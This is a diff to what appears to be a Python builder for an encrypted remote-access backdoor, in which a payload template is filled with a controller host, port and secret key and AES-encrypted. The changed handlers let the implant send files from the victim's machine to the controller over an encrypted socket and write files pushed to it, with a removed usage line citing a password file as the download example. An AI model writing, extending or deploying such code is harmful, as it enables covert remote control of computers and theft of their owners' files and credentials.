@@ -148,18 +148,25 @@ while 1:
 			s.send(encrypted)
 
 	elif decrypted.startswith("download "):
-		try:
-			downpath = pwd.strip('**r') + "***" + decrypted.split(' ')[1]
+		if lsvar == 'cd':
+			downpath = pwd.strip('**r') + "****" + decrypted.split(' ')[1]
 			with open(downpath, 'rb') as f:
 				encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFS" + f.read() + "EOFEOFEOFEOFEOFZ")
 			s.send(encrypted)
-		except Exception as e:
-			encrypted = EncodeAES(cipher, " [X] Failed to download file!**n usage e.g: download C:\Users\John\password.txt**nEOFEOFEOFEOFEOFX")
+		else:
+			downpath = pwd.strip('**r') + "/" + decrypted.split(' ')[1]
+			with open(downpath, 'rb') as f:
+				encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFS" + f.read() + "EOFEOFEOFEOFEOFZ")
 			s.send(encrypted)
 
 	elif decrypted.startswith("EOFEOFEOFEOFEOFS"):
-		ufilename = pwd.strip('**r') + '***' + decrypted[16:32].strip('*')
-		f = open(ufilename, 'wb')
+		if lsvar == 'cd':
+			ufilename = pwd.strip('**r') + '****' + decrypted[16:32].strip('*')
+			f = open(ufilename, 'wb')
+		else:
+			ufilename = pwd.strip('**r') + '/' + decrypted[16:32].strip('*')
+			f = open(ufilename, 'wb')
+
 		f.write(decrypted[32:])
 		while not decrypted.endswith("EOFEOFEOFEOFEOFZ"):
 			data = s.recv(1024)
@@ -208,7 +215,7 @@ try:
 except:
 	serverName = "server.py"
 
-readyscript = finput.replace('**n', '\\n').replace('***HOST***', hostname).replace('***PORT***', portnumber).replace('***SECRET***', secretkey).replace('***', '\\\\').replace('**r', '\\r')
+readyscript = finput.replace('**n', '\\n').replace('***HOST***', hostname).replace('***PORT***', portnumber).replace('***SECRET***', secretkey).replace('****', '\\\\').replace('**r', '\\r')
 f = open(outputName, 'w')
 cipherEnc = AES.new(key)
 encrypted = EncodeAES(cipherEnc, readyscript)
